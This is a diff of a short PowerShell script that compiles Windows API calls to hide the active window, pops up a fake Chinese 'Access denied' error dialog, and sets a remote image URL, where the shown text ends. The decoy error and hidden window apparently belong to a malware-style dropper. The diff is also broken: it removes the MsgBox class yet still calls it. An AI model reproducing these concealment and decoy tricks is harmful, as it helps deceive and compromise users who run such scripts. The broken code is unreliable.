@@ -1,24 +1,6 @@
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-using System.Threading;
-
-public class MsgBox {
-    [DllImport("user32.dll", CharSet=CharSet.Auto)]
-    public static extern int MessageBox(IntPtr hWnd, string text, string caption, int type);
-
-    public static void ShowAsync(string text, string caption) {
-        new Thread(() => { MessageBox(IntPtr.Zero, text, caption, 0); }).Start();
-    }
-}
-"@
-
-
-[MsgBox]::ShowAsync("访问被拒绝", "错误")
-
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
 public class WinAPI {
     [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
     [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
@@ -29,7 +11,7 @@ public class WinAPI {
 $SW_HIDE = 0
 $hWnd = [WinAPI]::GetForegroundWindow()
 [WinAPI]::ShowWindow($hWnd, $SW_HIDE)
-
+[MsgBox]::ShowAsync("访问被拒绝", "错误")
 
 
 $url  = "https://pic3.zhimg.com/v2-f7c45a855f5881818fe36e8c3ab5645e_r.jpg"
